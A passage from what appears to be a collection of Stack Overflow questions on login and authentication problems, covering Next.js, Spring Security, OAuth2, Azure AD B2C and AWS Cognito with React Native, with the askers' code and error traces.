<p>The problem is that when the page is reloaded, the state is lost and the LOG OUT button disappears.</p>
<pre><code>&quot;use client&quot;;

import {createContext, useContext, useEffect, useState} from &quot;react&quot;;
import {useRouter} from 'next/navigation';

const host = process.env.NEXT_PUBLIC_API_HOST;
export const AdminAuthContext = createContext({});
export const AdminAuthProvider = ({children}) =&gt; {
    const router = useRouter(); // Initialize useRouter

    const [user, setUser] = useState(null); // State to store admin user details

    const doAdminLogin = async (email, password) =&gt; {
        const request = await fetch(`${host}/api/admin/login`, {
            cache: &quot;no-store&quot;,
            method: &quot;POST&quot;,
            credentials: &quot;include&quot;,
            headers: {
                &quot;Content-Type&quot;: &quot;application/json&quot;,
            },
            body: JSON.stringify({email, password}),
        });

        if (!request.ok) {
            console.error('Login failed');
            throw new Error(&quot;Error logging in&quot;);
        }

        const res = await request.json();
        setUser(res.username);
        router.push('/private/admin/dashboard'); // Use router.push to navigate
    };

    const doAdminLogout = async () =&gt; {
        const request = await fetch(`${host}/api/admin/logout`, {
            cache: &quot;no-store&quot;,
            method: &quot;POST&quot;,
            credentials: &quot;include&quot;,
        });
    };

    return (
            &lt;AdminAuthContext.Provider value={{user, doAdminLogin, doAdminLogout}}&gt;
                {children}
            &lt;/AdminAuthContext.Provider&gt;
    );
};

export function useAdminAuthContext() {
    return useContext(AdminAuthContext);
}
</code></pre>
<p>So the question is: What do I need to change so my  component shows the LOG OUT button when the user is logged in?</p>
"
"<p>When I throw my custom exception (AccountNotActivatedException) in the loadUserByUsername method, Spring wraps it in an InternalAuthenticationServiceException. In general, almost any exception in this method is packaged into it.
The problem is that such an exception cannot be handled using @ExceptionHandler (or any other, because it wraps all exceptions in it) and it has its own behavior.
And I need to understand exactly what error the user encountered during authentication in order to display it on the view.
Each situation should have its own error text to indicate to the user what exactly is wrong.</p>
<p>And now, as I understand it, in case of an error, it simply passes the “error” parameter to the request and returns the login page, I can no longer interact with it.</p>
<pre><code>@Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {

        boolean accountNonExpired = true;
        boolean credentialsNonExpired = true;
        boolean accountNonLocked = true;

        User user = userRepository.findByUsername(username);

        if(user==null){
            throw  new UsernameNotFoundException(&quot;Unable to login. The email or password is incorrect&quot;);
        }
        if (!user.isEnabled()) {
            throw new AccountNotActivatedException(
                    &quot;This account is not activated. &quot; +
                            &quot;To complete the registration, follow the link in the letter that was sent to your email address. &quot; +
                            &quot;We also recommend you check the \&quot;Spam\&quot; category.&quot;
            );
        }
        return new org.springframework.security.core.userdetails.User(
                user.getUsername(),
                user.getPassword(),
                user.isEnabled(),
                accountNonExpired,
                credentialsNonExpired,
                accountNonLocked,
                Collections.singleton(user.getRole()));
    }
</code></pre>
<p>This is my Spring Configuration</p>
<pre><code>public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
   http
           .anonymous(AbstractHttpConfigurer::disable)
           .authorizeHttpRequests(authorize -&gt; authorize
                   .requestMatchers(PathRequest
                           .toStaticResources()
                           .atCommonLocations())
                   .permitAll()
                   .requestMatchers(&quot;/book/{bookId}/testResults&quot;)
                   .authenticated()
                   .anyRequest().permitAll())
           .formLogin(login -&gt;login
                   .loginPage(&quot;/login&quot;)
                   .defaultSuccessUrl(&quot;/&quot;)
                   .permitAll())
           .logout(logout -&gt;logout
                   .logoutUrl(&quot;/logout&quot;)
                   .logoutSuccessUrl(&quot;/login&quot;)
                   .invalidateHttpSession(true)
                   .deleteCookies(&quot;JSESSIONID&quot;)
                   .permitAll());
                /*.oauth2Login( oauth2-&gt;oauth2
                        .loginPage(&quot;/login&quot;));*/
                      /*  .defaultSuccessUrl(&quot;/&quot;)
                        .userInfoEndpoint(userInfo-&gt; userInfo
                                .oidcUserService(oidcUserService())));*/
   return http.build();
}
</code></pre>
<p>P.S. I would also like to ask if it is true that Spring itself checks the login/password without me or should I do it myself, accept data from the form and access the database and check this data using the controller method.
Now I just use the Post method to transfer information to the /login endpoint and do not have PostMapping for this resource</p>
"
"<p>heres a simplified version I created so someone can help me, been stuck for a while now.</p>
<p>​</p>
<p>This is my home page, I have a button that routes to a page called redirect, it creates a cookie while routing:</p>
<pre><code>&quot;use client&quot;;
import { useRouter } from &quot;next/navigation&quot;;
import Cookies from &quot;js-cookie&quot;;

export default function Home() {
  const router = useRouter();

  const login = (e: { preventDefault: () =&gt; void }) =&gt; {
    e.preventDefault();

    console.log(&quot;login&quot;);
    Cookies.set(&quot;currentUser&quot;, &quot;true&quot;);
    router.push(&quot;/redirect&quot;);
  };

  return (
    &lt;main className=&quot;flex min-h-screen flex-col items-center justify-between p-24&quot;&gt;
      &lt;button onClick={(e) =&gt; login(e)}&gt;click me&lt;/button&gt;
    &lt;/main&gt;
  );
}
</code></pre>
<p>​</p>
<p>Routes to this:</p>
<pre><code>&quot;use client&quot;;
import React from &quot;react&quot;;

function page() {
  return &lt;div&gt;redirect&lt;/div&gt;;
}

export default page;
</code></pre>
<p>​</p>
<p>Here's what I have so far in my middleware:</p>
<pre><code>import type { NextRequest } from 'next/server'

 
export default function middleware(request: NextRequest) {
  let currentUser = request.cookies.get('currentUser')?.value
 
  if (!currentUser) {
    return Response.redirect(new URL('/', request.url))
  }
}
</code></pre>
<p>It checks if the cookie exists, if it doesn't I want it to redirect back to the homepage. I do have the file (middleware.ts) in my root folder. Sadly it isn't working and I'm not sure why. Spent the whole afternoon on yt, documentation, etc. I'm just a casual programmer so pardon me if this is too easy to figure out.</p>
<p>I'd appreciate any help</p>
"
"<p>in my case i create login api ,when user enter thier details at that time token not generating.so give me a solutions.</p>
<p>in my case i create login api ,when user enter thier details at that time token not generating.so give me a solutions.</p>
<p>I create token , in behalf generaing token any user can access api</p>
"
"<p>I want to develop a web portal for the company I work for, that has a number of applications. Im using Single SPA framework, and its Layout Engine.</p>
<p>It looks like this:</p>
<pre><code>      &lt;single-spa-router&gt;
        
        &lt;login&gt;
          &lt;route path=&quot;login&quot;&gt;
            &lt;application name=&quot;@login&quot;&gt;&lt;/application&gt;
          &lt;/route&gt;
        &lt;/login&gt;

        &lt;nav &gt;
          &lt;application name=&quot;@angular-navbar&quot;&gt;&lt;/application&gt;
        &lt;/nav&gt;
        &lt;main&gt;
          &lt;route path=&quot;App1&quot;&gt;
            &lt;application name=&quot;@angular-app&quot;&gt;&lt;/application&gt;
          &lt;/route&gt;
          &lt;route path=&quot;react&quot;&gt;
            &lt;application name=&quot;@react-app/react-app&quot;&gt;&lt;/application&gt;
          &lt;/route&gt;
        &lt;/main&gt;
      &lt;/single-spa-router&gt;
</code></pre>
<p>I want to make an authentication form, which will require the user to pass username and password. This page should always open first, and then after the user has successfully logged in, the navbar and other applications are shown.</p>
<p>Is there a way to do this using Single SPA Layout Engine? Or what would be the best practice to follow?</p>
<p>I was searching for a project that has implemented this, but I couldn't find any. So if anybody has an idea, or knows how this should be done, it would be very appreciated.</p>
"
"<p><strong>I want to create a frontend project using</strong></p>
<p><code>npx create-react-app frontend</code></p>
<p>encountered an error saying</p>
<blockquote>
<p>npm ERR! code ENOENT
npm ERR! syscall lstat
npm ERR! path C:\Users\user\AppData\Roaming\npm
npm ERR! errno -4058
npm ERR! enoent ENOENT: no such file or directory, lstat 'C:\Users\user\AppData\Roaming\npm'
npm ERR! enoent This is related to npm not being able to find a file.<br />
npm ERR! enoent
npm ERR! A complete log of this run can be found in: C:\Users\user\AppData\Local\npm-cache_logs\2024-03-06T09_13_21_921Z-debug-0.log</p>
</blockquote>
<p>Tried browsing for answers but in browsing hell already.
I tried using <code>Vite</code> which is much easier but the folder structure of what I'm watching in YouTube is different so I get more confused.</p>
"
"<p>Here is the specific code that uses the session key and passes it to the server for authentication</p>
<pre><code>    a2 = encrypt.AESEncrypt(a2, &quot;&lt;%=(String)session.getAttribute(&quot;__GETLOGINKEY&quot;)%&gt;&quot;, 256);
</code></pre>
<p>been stuck in doing the login page for days. appreciate all the help.</p>
"
"<p>Could you please send or publish an example of an abp.io Blazor WASM solution that includes support for Windows authentication and OpenIddict authentication at the same time?
Also of interest is the scheme in which unsuccessful Windows authentication redirects the user to the standard SignIn page.
Thank you.</p>
<p>I tried the following:
<a href=""https://support.abp.io/QA/Questions/6204/windows-Authentication"" rel=""nofollow noreferrer"">https://support.abp.io/QA/Questions/6204/windows-Authentication</a>
But I had no success.</p>
"
"<p>The computer I am using is pretty much for gaming; it's got pretty good specifications and nice features, but it cannot run Starfield. I tried running it, but it didn't work at all. This, however, is not the point. After I installed it, weird things started happening to my computer. The wallpaper now uses a solid black colour instead of images, and my files for some games aren't saving unless I intervene manually. One example is Minecraft. Usually, once I change settings for a version, it should keep those settings for next time, right? Wrong. Every time I want to play it, I have to change every setting to what I want it to be. Another example is Ubisoft Connect. Though not a game, I have to use it if I want to play the new TrackMania, of which I am a big fan. Now, I have to enter my login details, even if I select &quot;Remember me&quot; on the login. How can I fix these problems? It's getting pretty annoying.</p>
<p>Details:
OS: Windows 11
(I can add more if necessary)</p>
<p>What should happen:</p>
<ul>
<li>Files should save</li>
<li>Login details are remembered</li>
<li>The wallpaper is a slideshow of images</li>
</ul>
<p>What actually happens:</p>
<ul>
<li>Files don't save indirectly</li>
<li>I have to put my logins every time</li>
<li>When I open my computer, I am greeted with the darkness of the void (solid black background)</li>
</ul>
<p>Edit: It persists when I uninstall it, and it also affects Xbox Game Bar as well</p>
"
"<p>I'm learning OAuth2 by writing a simple client-side React app. Currently, I don't know which of these 2 flows to choose:</p>
<ul>
<li>Implicit flow: Suggested by Google OAuth (my test code use their OAuth service)</li>
<li>Authorization code with PKCE: <a href=""https://aaronparecki.com/oauth-2-simplified/#authorization"" rel=""nofollow noreferrer"">Suggested</a> by Aaron Parecki. He explicitly mentioned that it replaces the Implicit flow as best practice.</li>
</ul>
<p>So which one should I choose?</p>
<p>Update: My app also has server part, not just a client. Think of a Todo app, and users can use Google to login to see their stuffs which is saved on my server. I add this because I think Implicit flow could be for purely client side app (however I can't think of any such app).</p>
"
"<p>I need the authentication frontend (login/signup) to be an independent project to which different web applications can access in order to authenticate the user.</p>
<p><strong>Example</strong></p>
<p>Similar to OpenAI with ChatGPT. The user can log in from both the openai landing site or from the chatGPT site. However, both options redirect the user to the same authentication independent site.</p>
<p><strong>Question</strong></p>
<p>If I host this authentication frontend on vercel with a 'static' DNS, e.g. &quot;my-auth.com&quot; every user would have access without needing to go through the landing or the product site. How could I make it to only redirect users that clicked the Log in button on whichever of my expected sites (landing, product...)?</p>
"
"<p>I have a react SPA which is consuming dotnet 3.1 web api.</p>
<p>Right now the authentication is using pingFederate. Right now I need to switch to Azure AD B2C.</p>
<p>Currently the authentication to PingFederate is done using <a href=""https://www.npmjs.com/package/@openid/appauth"" rel=""nofollow noreferrer"">https://www.npmjs.com/package/@openid/appauth</a> this npm package.</p>
<p>As per the documentation its calling a method as below to fetch the configuration.</p>
<pre><code>AuthorizationServiceConfiguration.fetchFromIssuer(openIdConnectUrl)
  .then(response =&gt; {
    log('Fetched service configuration', response);
    this.configuration = response;
    this.showMessage('Completed fetching configuration');
  })
  .catch(error =&gt; {
    log('Something bad happened', error);
    this.showMessage(`Something bad happened ${error}`)
  });
</code></pre>
<p>here the fetchFromIssuer method is expecting an openid connect URL.
As per my understanding(Correct me if I am wrong), Azure AD B2C will support openid protocol.</p>
<p>From <a href=""https://learn.microsoft.com/en-us/azure/active-directory-b2c/openid-connect"" rel=""nofollow noreferrer"">this tutorial</a> I have got this URL <a href=""https://fabrikamb2c.b2clogin.com/fabrikamb2c.onmicrosoft.com/b2c_1_sign_in/v2.0/.well-known/openid-configuration"" rel=""nofollow noreferrer"">https://fabrikamb2c.b2clogin.com/fabrikamb2c.onmicrosoft.com/b2c_1_sign_in/v2.0/.well-known/openid-configuration</a>.</p>
<p>But this is giving me an error. Without any messages. How can I use this method for Azure AD B2C with AppAuth js? Or how can I spot the correct openid URL for azure B2C?</p>
<p>Usually most of the tutorials are using msal for react based azure B2C implementations. But here I have a dependency with openid.</p>
"
"<p>I have a certificate authenticated <code>Azure App Service</code>. This service is behind <code>APIM</code> which is doing the authentication. Since some days, this service now systematically returns <code>ECONNRESET</code> error, when I call it twice in a row. However, if I call it (ex. from Postman), then hit <code>Cancel</code> and <code>Send</code> again, it works. It keeps working until there is no more requests for about 1 minute, then same issue repeats. Things I checked:</p>
<ul>
<li>SNAT Port Exhaustion (there is none)</li>
<li>Backend issues (there are none)</li>
</ul>
<p>Also I noticed in Postman that for the calls which succeed, the console shows a <code>Network</code> section with <code>addresses</code> and <code>tls</code> information (TLS version is v1/SSLv3 but protocol is TLSv3; <code>reused = true and authorized = true</code>).</p>
<p>Any idea what could be causing this?</p>
<p><strong>EDIT</strong><br />
Strongly related (maybe duplicate?) of this:<br />
<a href=""https://stackoverflow.com/questions/68146120"">Azure API Management (consumption tier): First request gives timeout and is not sent to backend service</a></p>
"
"<p>http://localhost/opencart/upload/ in xampp</p>
<p>[RemoteTestNG] detected TestNG version 7.8.0
Mar 06, 2024 5:33:55 PM org.openqa.selenium.devtools.CdpVersionFinder findNearestMatch
WARNING: Unable to find an exact match for CDP version 122, returning the closest version; found: 119; Please update to a Selenium version that supports CDP version 122
javax.mail.AuthenticationFailedException: 535-5.7.8 Username and Password not accepted. For more information, go to
535 5.7.8  <a href=""https://support.google.com/mail/?p=BadCredentials"" rel=""nofollow noreferrer"">https://support.google.com/mail/?p=BadCredentials</a> s12-20020a05600c384c00b00412f6e84202sm2289551wmr.33 - gsmtp</p>
<pre><code>at com.sun.mail.smtp.SMTPTransport$Authenticator.authenticate(SMTPTransport.java:932)
at com.sun.mail.smtp.SMTPTransport.authenticate(SMTPTransport.java:843)
at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:748)
at javax.mail.Service.connect(Service.java:388)
at javax.mail.Service.connect(Service.java:246)
at javax.mail.Service.connect(Service.java:195)
at javax.mail.Transport.send0(Transport.java:254)
at javax.mail.Transport.send(Transport.java:124)
at utilities.ExtentReportManager.sendEmail(ExtentReportManager.java:183)
at utilities.ExtentReportManager.onFinish(ExtentReportManager.java:128)
at org.testng.TestRunner.fireEvent(TestRunner.java:986)
at org.testng.TestRunner.afterRun(TestRunner.java:943)
at org.testng.TestRunner.run(TestRunner.java:624)
at org.testng.SuiteRunner.runTest(SuiteRunner.java:443)
at org.testng.SuiteRunner.runSequentially(SuiteRunner.java:437)
at org.testng.SuiteRunner.privateRun(SuiteRunner.java:397)
at org.testng.SuiteRunner.run(SuiteRunner.java:336)
at org.testng.SuiteRunnerWorker.runSuite(SuiteRunnerWorker.java:52)
at org.testng.SuiteRunnerWorker.run(SuiteRunnerWorker.java:95)
at org.testng.TestNG.runSuitesSequentially(TestNG.java:1280)
at org.testng.TestNG.runSuitesLocally(TestNG.java:1200)
at org.testng.TestNG.runSuites(TestNG.java:1114)
at org.testng.TestNG.run(TestNG.java:1082)
at org.testng.remote.AbstractRemoteTestNG.run(AbstractRemoteTestNG.java:115)
at org.testng.remote.RemoteTestNG.initAndRun(RemoteTestNG.java:251)
at org.testng.remote.RemoteTestNG.main(RemoteTestNG.java:77)
</code></pre>
<p>org.openqa.selenium.NoSuchWindowException: no such window: target window already closed
from unknown error: web view not found
(Session info: chrome=122.0.6261.95)
Build info: version: '4.15.0', revision: '1d14b5521b'
System info: os.name: 'Windows 11', os.arch: 'amd64', os.version: '10.0', java.version: '17.0.8.1'
Driver info: org.openqa.selenium.chrome.ChromeDriver
Command: [f78d541d8146826509be9f9158a5688f, screenshot {}]
Capabilities {acceptInsecureCerts: false, browserName: chrome, browserVersion: 122.0.6261.95, chrome: {chromedriverVersion: 122.0.6261.94 (880dbf29479c..., userDataDir: C:\Users\Admin\AppData\Loca...}, fedcm:accounts: true, goog:chromeOptions: {debuggerAddress: localhost:64746}, networkConnectionEnabled: false, pageLoadStrategy: normal, platformName: windows, proxy: Proxy(), se:cdp: ws://localhost:64746/devtoo..., se:cdpVersion: 122.0.6261.95, setWindowRect: true, strictFileInteractability: false, timeouts: {implicit: 0, pageLoad: 300000, script: 30000}, unhandledPromptBehavior: dismiss and notify, webauthn:extension:credBlob: true, webauthn:extension:largeBlob: true, webauthn:extension:minPinLength: true, webauthn:extension:prf: true, webauthn:virtualAuthenticators: true}
Session ID: f78d541d8146826509be9f9158a5688f
at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:77)
at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
at java.base/java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:499)
at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:480)
at org.openqa.selenium.remote.codec.w3c.W3CHttpResponseCodec.createException(W3CHttpResponseCodec.java:200)
at org.openqa.selenium.remote.codec.w3c.W3CHttpResponseCodec.decode(W3CHttpResponseCodec.java:133)
at org.openqa.selenium.remote.codec.w3c.W3CHttpResponseCodec.decode(W3CHttpResponseCodec.java:52)
at org.openqa.selenium.remote.HttpCommandExecutor.execute(HttpCommandExecutor.java:191)
at org.openqa.selenium.remote.service.DriverCommandExecutor.invokeExecute(DriverCommandExecutor.java:200)
at org.openqa.selenium.remote.service.DriverCommandExecutor.execute(DriverCommandExecutor.java:175)
at org.openqa.selenium.remote.RemoteWebDriver.execute(RemoteWebDriver.java:607)
at org.openqa.selenium.remote.RemoteWebDriver.execute(RemoteWebDriver.java:680)
at org.openqa.selenium.remote.RemoteWebDriver.execute(RemoteWebDriver.java:684)
at org.openqa.selenium.remote.RemoteWebDriver.getScreenshotAs(RemoteWebDriver.java:330)
at testBase.BaseClass.captureScreen(BaseClass.java:138)
at utilities.ExtentReportManager.onTestFailure(ExtentReportManager.java:97)
at org.testng.internal.TestListenerHelper.runTestListeners(TestListenerHelper.java:108)
at org.testng.internal.invokers.TestInvoker.runTestResultListener(TestInvoker.java:262)
at org.testng.internal.invokers.TestInvoker$MethodInvocationAgent.invoke(TestInvoker.java:973)
at org.testng.internal.invokers.TestInvoker.invokeTestMethods(TestInvoker.java:200)
at org.testng.internal.invokers.TestMethodWorker.invokeTestMethods(TestMethodWorker.java:148)
at org.testng.internal.invokers.TestMethodWorker.run(TestMethodWorker.java:128)
at java.base/java.util.ArrayList.forEach(ArrayList.java:1511)
at org.testng.TestRunner.privateRun(TestRunner.java:848)
at org.testng.TestRunner.run(TestRunner.java:621)
at org.testng.SuiteRunner.runTest(SuiteRunner.java:443)
at org.testng.SuiteRunner.runSequentially(SuiteRunner.java:437)
at org.testng.SuiteRunner.privateRun(SuiteRunner.java:397)
at org.testng.SuiteRunner.run(SuiteRunner.java:336)
at org.testng.SuiteRunnerWorker.runSuite(SuiteRunnerWorker.java:52)
at org.testng.SuiteRunnerWorker.run(SuiteRunnerWorker.java:95)
at org.testng.TestNG.runSuitesSequentially(TestNG.java:1280)
at org.testng.TestNG.runSuitesLocally(TestNG.java:1200)
at org.testng.TestNG.runSuites(TestNG.java:1114)
at org.testng.TestNG.run(TestNG.java:1082)
at org.testng.remote.AbstractRemoteTestNG.run(AbstractRemoteTestNG.java:115)
at org.testng.remote.RemoteTestNG.initAndRun(RemoteTestNG.java:251)
at org.testng.remote.RemoteTestNG.main(RemoteTestNG.java:77)</p>
<p>login to opencart site and register a&amp; login details</p>
"
"<p>Im having trouble setting up authentication with the default Cognito Hosted UI for my mobile application.
I am working with Amplify in a react-native project.</p>
<p>Ive got sign in with Apple and google both configured in the backend.</p>
<p>When I signout instead of being immediately directed to the unauthenticated user page which is WelcomeScreen.js an intermediate safari browser is opening up that is just completely not needed.</p>
<p>I have deep linking configured in the AppDelegate and Url in info.plist file.</p>
<p>here is my code:</p>
<p>App.js</p>
<pre><code>import React, { useEffect, useState } from 'react';
import { NavigationContainer } from '@react-navigation/native';
import { Amplify,Storage, Auth, Hub} from 'aws-amplify';
import awsmobile from './src/aws-exports';
import AppNavigator from './AppNavigator';
import { ThemeProvider } from './ThemeContext';
import Toast from 'react-native-toast-message';
import WelcomeScreen from './WelcomeScreen';


Amplify.configure(awsmobile);
Storage.configure({
  customPrefix: {
    public: &quot;&quot;,
  },
});

function App() {
  const [isUserLoggedIn, setIsUserLoggedIn] = useState(false);

  useEffect(() =&gt; {
    checkCurrentUser();

    const hubListener = Hub.listen('auth', ({ payload: { event } }) =&gt; {
      if (event === 'signIn' || event === 'cognitoHostedUI') {
        setIsUserLoggedIn(true);
      } else if (event === 'signOut') {
        setIsUserLoggedIn(false);
      }
    });

    return () =&gt; Hub.remove('auth', hubListener);
  }, []);

  const checkCurrentUser = async () =&gt; {
    try {
      await Auth.currentAuthenticatedUser();
      setIsUserLoggedIn(true);
    } catch (error) {
      console.log('No current user', error);
      setIsUserLoggedIn(false);
    }
  };

  return (
    &lt;ThemeProvider&gt;
      &lt;NavigationContainer&gt;
        {isUserLoggedIn ? (
          &lt;AppNavigator /&gt;
        ) : (
          &lt;WelcomeScreen /&gt;
        )}
      &lt;/NavigationContainer&gt;
      &lt;Toast /&gt;
    &lt;/ThemeProvider&gt;
  );
}

export default App;

</code></pre>
<p>WelcomeScreen.js</p>
<pre><code>import React from &quot;react&quot;;
import { View, Text, TouchableOpacity, StyleSheet, Linking } from &quot;react-native&quot;;
import { InAppBrowser } from 'react-native-inappbrowser-reborn'; // Import InAppBrowser
import awsmobile from './src/aws-exports';
import { Amplify} from 'aws-amplify';

Amplify.configure(awsmobile);

const WelcomeScreen = () =&gt; {

  const signInWithHostedUI = async () =&gt; {
    const { domain, redirectSignIn, responseType, scope } = awsmobile.oauth;
    const url = `https://${domain}/oauth2/authorize?response_type=${responseType}&amp;client_id=${awsmobile.aws_user_pools_web_client_id}&amp;redirect_uri=${encodeURIComponent(redirectSignIn)}&amp;scope=${encodeURIComponent(scope.join(' '))}`;
  
    console.log(&quot;Attempting to open URL:&quot;, url); // Log the URL being opened
  
    try {
      const isAvailable = await InAppBrowser.isAvailable();
      console.log(&quot;InAppBrowser isAvailable:&quot;, isAvailable);
  
      if (isAvailable) {
        console.log(&quot;Opening In-App Browser for sign-in&quot;);
        await InAppBrowser.openAuth(url, redirectSignIn, {
          dismissButtonStyle: 'cancel',
          preferredBarTintColor: '#453AA4',
          preferredControlTintColor: 'white',
          readerMode: false,
          animated: true,
          modalEnabled: true,
          enableBarCollapsing: false,
          showTitle: false,
          enableUrlBarHiding: true,
          enableDefaultShare: false,
          enableUrlBarHiding:true,
          //ios property
          ephemeralWebSession: true,
        }).then((response) =&gt; {
          if (
            response.type === 'success' &amp;&amp;
            response.url
          ) {
            Linking.openURL(response.url);
            

          }
        });
      } else {
        Linking.openURL(url);
      }
    } catch (error) {
      Linking.openURL(url);
    }

  };
  return (
    &lt;View style={styles.container}&gt;
      &lt;Text style={styles.title}&gt;Welcome to Artiflect!&lt;/Text&gt;
      &lt;Text style={styles.paragraph}&gt;
        Revolutionize the way you document and value your collections.
      &lt;/Text&gt;

      &lt;View style={styles.buttonContainer}&gt;
        &lt;TouchableOpacity
          style={styles.loginButton}
          onPress={signInWithHostedUI}
        &gt;
          &lt;Text style={styles.buttonText}&gt;Log In or Sign Up&lt;/Text&gt;
        &lt;/TouchableOpacity&gt;
       
      &lt;/View&gt;
    &lt;/View&gt;
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: &quot;center&quot;,
    alignItems: &quot;center&quot;,
    backgroundColor: &quot;#76B947&quot;,
  },
  paragraph: {
    marginTop: 15,
    textAlign: &quot;center&quot;,
    fontSize: 16,
    color: &quot;white&quot;,
    marginHorizontal: 30,
  },
  title: {
    fontSize: 38,
    textAlign: &quot;center&quot;,
    color: &quot;white&quot;,
    marginHorizontal: 30,
    marginTop: -20,
  },

  buttonContainer: {
    flexDirection: &quot;row&quot;,
    justifyContent: &quot;space-evenly&quot;,
    alignItems: &quot;center&quot;,
    width: &quot;100%&quot;,
    position: &quot;absolute&quot;,
    bottom: 50,
  },
  loginButton: {
    backgroundColor: &quot;transparent&quot;,
    borderWidth: 1,
    borderColor: &quot;#0B0B0B&quot;,
    padding: 10,
    borderRadius: 25,
    width: &quot;40%&quot;,
  },
  signUpButton: {
    backgroundColor: &quot;#0B0B0B&quot;,
    borderWidth: 1,
    borderColor: &quot;#0B0B0B&quot;,
    padding: 10,
    borderRadius: 25,
    width: &quot;40%&quot;,
  },
  buttonText: {
    color: &quot;white&quot;,
    fontSize: 16,
    textAlign: &quot;center&quot;,
  },
  // ... other styles as needed ...
});

export default WelcomeScreen;

</code></pre>
<p>Settings.js(location of the signout button)</p>
<pre><code>import React, { useState, useContext, useEffect } from &quot;react&quot;;
import {
  View,
  StyleSheet,
  TouchableOpacity,
  Text,
  Linking,
  Alert
} from &quot;react-native&quot;;
import { Auth} from &quot;aws-amplify&quot;;

import { ThemeContext } from &quot;./ThemeContext&quot;;

export default function Settings({ navigation }) {
  const { theme, toggleTheme } = useContext(ThemeContext);

  // State to track the current mode for immediate UI update
  const [currentMode, setCurrentMode] = useState(theme.mode);

  const [styles, setStyles] = useState(() =&gt; getStyles(theme));

  useEffect(() =&gt; {
    setStyles(getStyles(theme));
    setCurrentMode(theme.mode); // Update current mode when theme changes
  }, [theme]);

  const handleToggleTheme = () =&gt; {
    toggleTheme();
    setCurrentMode(currentMode === &quot;light&quot; ? &quot;dark&quot; : &quot;light&quot;); // Immediately update the mode for the button text
  };

  const openArtiflectLink = () =&gt; {
    Linking.openURL(&quot;https://artiflect.app&quot;);
  };

  const signOut = async () =&gt; {
    try {
      await Auth.signOut();
      // Handle any post-sign-out logic here, like redirecting to a sign-in screen
    } catch (error) {
      console.error('Error signing out:', error);
    }
  };

  const confirmSignOut = () =&gt; {
    Alert.alert(
      &quot;Sign Out&quot;, // Title of the alert
      &quot;Are you sure you want to sign out?&quot;, // Message shown to the user
      [
        {
          text: &quot;Cancel&quot;,
          onPress: () =&gt; console.log(&quot;Cancel Pressed&quot;),
          style: &quot;cancel&quot;
        },
        { text: &quot;Yes&quot;, onPress: () =&gt; signOut() } // Call your signOut function here
      ],
      { cancelable: false }
    );
  };

  const navigateToContact = () =&gt; {
    navigation.navigate(&quot;contact&quot;);
  };

  const deleteAccount = () =&gt; {
    Alert.alert(
      &quot;Delete Account&quot;,
      &quot;Are you sure you want to permanently delete your account?&quot;,
      [
        // If the user confirms, proceed with account deletion
        {
          text: &quot;Yes&quot;,
          onPress: async () =&gt; {
            try {
              const user = await Auth.currentAuthenticatedUser();
              user.deleteUser((err, result) =&gt; {
                if (err) {
                  console.error(&quot;Error deleting user account: &quot;, err);
                  return;
                }
                console.log(&quot;Account deleted successfully&quot;, result);
                // Optionally, sign the user out and redirect them to a landing page
                signOut()
              });
            } catch (error) {
              console.error(&quot;Error fetching current user for deletion: &quot;, error);
            }
          },
        },
        {
          text: &quot;No&quot;,
          // If the user cancels, do nothing
          style: &quot;cancel&quot;,
        },
      ],
      { cancelable: false }
    );
  };

  return (
    &lt;View style={styles.container}&gt;
      &lt;TouchableOpacity
        style={styles.buttonContainer}
        onPress={handleToggleTheme}
      &gt;
        &lt;Text style={styles.buttonText}&gt;
          {currentMode === &quot;dark&quot; ? &quot;Light Mode&quot; : &quot;Dark Mode&quot;}
        &lt;/Text&gt;
      &lt;/TouchableOpacity&gt;

      &lt;TouchableOpacity style={styles.buttonContainer} onPress={confirmSignOut}&gt;
        &lt;Text style={styles.buttonText}&gt;Sign Out&lt;/Text&gt;
      &lt;/TouchableOpacity&gt;

      &lt;TouchableOpacity
        style={styles.buttonContainer}
        onPress={navigateToContact}
      &gt;
        &lt;Text style={styles.buttonText}&gt;Feedback&lt;/Text&gt;
      &lt;/TouchableOpacity&gt;

      &lt;TouchableOpacity
      style={styles.deletebuttonContainer}
      onPress={deleteAccount}
    &gt;
      &lt;Text style={styles.buttonText}&gt;Delete Account&lt;/Text&gt;
    &lt;/TouchableOpacity&gt;

      &lt;TouchableOpacity
        style={styles.linkContainer}
        onPress={openArtiflectLink}
      &gt;
        &lt;Text style={styles.linkText}&gt;Artiflect&lt;/Text&gt;
      &lt;/TouchableOpacity&gt;
    &lt;/View&gt;
  );
}
</code></pre>
<p>info.plist:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
    &lt;key&gt;CADisableMinimumFrameDurationOnPhone&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;CFBundleDevelopmentRegion&lt;/key&gt;
    &lt;string&gt;$(DEVELOPMENT_LANGUAGE)&lt;/string&gt;
    &lt;key&gt;CFBundleDisplayName&lt;/key&gt;
    &lt;string&gt;AppName&lt;/string&gt;
    &lt;key&gt;CFBundleExecutable&lt;/key&gt;
    &lt;string&gt;$(EXECUTABLE_NAME)&lt;/string&gt;
    &lt;key&gt;CFBundleIdentifier&lt;/key&gt;
    &lt;string&gt;$(PRODUCT_BUNDLE_IDENTIFIER)&lt;/string&gt;
    &lt;key&gt;CFBundleInfoDictionaryVersion&lt;/key&gt;
    &lt;string&gt;6.0&lt;/string&gt;
    &lt;key&gt;CFBundleName&lt;/key&gt;
    &lt;string&gt;$(PRODUCT_NAME)&lt;/string&gt;
    &lt;key&gt;CFBundlePackageType&lt;/key&gt;
    &lt;string&gt;$(PRODUCT_BUNDLE_PACKAGE_TYPE)&lt;/string&gt;
    &lt;key&gt;CFBundleShortVersionString&lt;/key&gt;
    &lt;string&gt;1.0.0&lt;/string&gt;
